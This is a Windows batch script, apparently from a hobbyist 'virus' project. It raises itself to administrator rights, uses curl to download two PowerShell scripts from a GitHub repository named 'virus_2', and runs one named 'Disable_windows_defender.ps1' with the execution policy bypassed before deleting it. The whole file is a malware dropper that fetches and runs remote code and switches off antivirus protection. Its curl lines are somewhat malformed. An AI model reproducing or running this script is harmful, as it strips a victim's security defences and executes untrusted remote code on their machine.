@echo off
:: Check if the script is already running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    :: Relaunch the script with elevated rights
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)


curl -O Disable_windows_defender.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/Disable_windows_defender.ps1 > Disable_windows_defender.ps1
curl -O gdi.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/gdi.ps1 > gdi.ps1

@echo off
REM Get the directory of the batch file
set "SCRIPT_DIR=%~dp0"

REM Run the PowerShell script from the same directory
powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%Disable_windows_defender.ps1"
del Disable_windows_defender.ps1

